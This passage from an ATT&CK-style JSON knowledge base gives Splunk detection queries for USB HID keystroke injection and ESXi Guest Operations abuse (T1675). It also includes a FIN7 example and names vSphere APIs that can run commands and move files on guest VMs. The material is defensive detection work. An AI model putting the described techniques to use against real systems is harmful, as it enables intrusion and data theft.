      "Monitor for newly executed processes when removable media is mounted. Additionally, monitor for unexpected or rapid USB HID enumeration events (e.g., a USB HID device connecting and immediately issuing keystrokes) or anomalies (e.g., a device claiming to be a keyboard but has a suspicious vendor ID) that could indicate a possible rogue device. Tools like Windows Event Logs (e.g., event IDs 20001 - 20003), sysfs on Linux (e.g.,/sys/bus/usb/devices/), and macOS IORegistry (e.g.,ioreg -p IOUSB) can provide insight into input devices.Additionally, consider leveraging keyboard hook APIs to monitor for keystrokes that are too fast and too uniform (e.g., a script executing keystrokes with no human variation or that are too precise).Analytic 1 Detect HID like Device Injectionindex=wineventlog sourcetype=\"WinEventLog:System\" EventCode=400 OR EventCode=20001| eval usb_device=coalesce(UsbDevice, DeviceName)| search usb_device=\"keyboard\" OR usb_device=\"HID\"| transaction usb_device maxspan=30s| join usb_device    [      search index=main sourcetype=\"WinEventLog:Security\" (EventCode=4688 OR EventCode=4104)      | stats count by usb_device, _time, CommandLine, ParentProcessName, NewProcessName    ]| where count > 0| table _time, usb_device, NewProcessName, CommandLine, ParentProcessName",
      "Monitor log files for process execution through command-line and scripting activities. Additionally monitor for various tools launching keystrokes such as PowerShell, AutoHotkey, xdotool, AppleScript, or WScript.Analytic 1 - Unusual Input Simulatorsindex=main sourcetype=\"WinEventLog:Security\" OR sourcetype=sysmon(NewProcessName=\"powershell.exe\" OR NewProcessName=\"cmd.exe\" OR NewProcessName=\"bash\" OR NewProcessName=\"osascript\")| stats earliest(_time) as start_time, latest(_time) as end_time, values(ParentProcessName) as parent, values(CommandLine) as cmd by NewProcessName, user| where parent=\"explorer.exe\" OR parent=\"winlogon.exe\" OR parent=\"unknown\"| eval duration = end_time - start_time| where duration < 10| table start_time, NewProcessName, cmd, parent, user",
      "Monitor for any attempts to enable scripts running on a system that would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.Analytic 1 - Scripts injected via clipboard or keystroke simulation(index=main sourcetype=\"WinEventLog:Microsoft-Windows-PowerShell/Operational\" EventCode=4104)OR (index=main sourcetype=sysmon EventCode=1 CommandLine=\"osascript\" OR CommandLine=\"python\" OR CommandLine=\"bash\")| transaction user maxspan=15s| join user    [        search index=wineventlog sourcetype=\"WinEventLog:System\" (EventCode=400 OR EventCode=20001)        | search DeviceName=\"HID\" OR DeviceName=\"Keyboard\"        | stats count by user, _time, DeviceName    ]| table _time, user, CommandLine, DeviceName"
    ],
    "Procedure Examples": [
      "FIN7 has used malicious USBs to emulate keystrokes to launch PowerShell to download and execute malware from the adversary's server.[4]"
    ]
  },
  "T1675": {
    "Name": "ESXi Administration Command",
    "Description": "Adversaries may abuse ESXi administration services to execute commands on guest machines hosted within an ESXi virtual environment. Persistent background services on ESXi-hosted VMs, such as the VMware Tools Daemon Service, allow for remote management from the ESXi server. The tools daemon service runs asvmtoolsd.exeon Windows guest operating systems,vmware-tools-daemonon macOS, andvmtoolsdon Linux.[1]Adversaries may leverage a variety of tools to execute commands on ESXi-hosted VMs – for example, by using the vSphere Web Services SDK to programmatically execute commands and scripts via APIs such asStartProgramInGuest,ListProcessesInGuest,ListFileInGuest, andInitiateFileTransferFromGuest.[2][3]This may enable follow-on behaviors on the guest VMs, such asFile and Directory Discovery,Data from Local System, orOS Credential Dumping.",
    "Detects": [
      "Monitor for Guest Operations API calls executed from the ESXi host to a guest VM, especially:-StartProgramInGuest-ListProcessesInGuest-InitiateFileTransferFromGuest-ListFileInGuestSudden usage from ESXi management accounts (especially out of hours). Use of Guest Ops on VMs wherevmtoolsdis not typically used or disabled. Operations from unusual ESXi IPs or using credentials not normally associated with VM management.[5]Analytic 1 - ESXi Abusesourcetype=\"vmware:log\"| eval guest_operation=coalesce('eventMessage', 'message')| search guest_operation=\"StartProgramInGuest\" OR guest_operation=\"ListProcessesInGuest\" OR guest_operation=\"ListFileInGuest\" OR guest_operation=\"InitiateFileTransferFromGuest\"| stats count by host, vm_name, user, guest_operation, _time| eventstats count as total_operations by host| where total_operations > 10 OR (user!=\"expected_admin\" AND total_operations > 1)| table _time, host, vm_name, user, guest_operation"
    ],
    "Procedure Examples": [
      "If not required, restrict the permissions of users to perform Guest Operations on ESXi-hosted VMs.[4]"
    ]
  }
}